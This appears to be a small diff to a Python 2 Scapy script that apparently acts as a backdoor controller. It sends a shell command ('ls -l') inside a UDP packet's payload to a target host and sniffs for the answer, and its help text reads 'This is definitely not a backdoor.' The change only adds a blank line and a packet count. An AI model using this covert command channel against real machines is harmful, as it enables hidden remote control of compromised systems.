@@ -4,6 +4,7 @@ import argparse
 def packetFunc(packet):
   print packet.load
 
+
 parser = argparse.ArgumentParser(description="This is definitely not a backdoor.")
 parser.add_argument('-s'
                    , '--sport'
@@ -26,4 +27,4 @@ command = "ls -l"
 sniffFilter = 'udp and dst port {0} and src port {1}' .format(args.sourcePort, args.destPort)
 packet = IP(dst=args.destIP)/UDP(dport=int(args.destPort), sport=int(args.sourcePort))/Raw(load=command)
 send(packet)
-sniff(filter=sniffFilter,prn=packetFunc)
+sniff(filter=sniffFilter,prn=packetFunc, count=1)
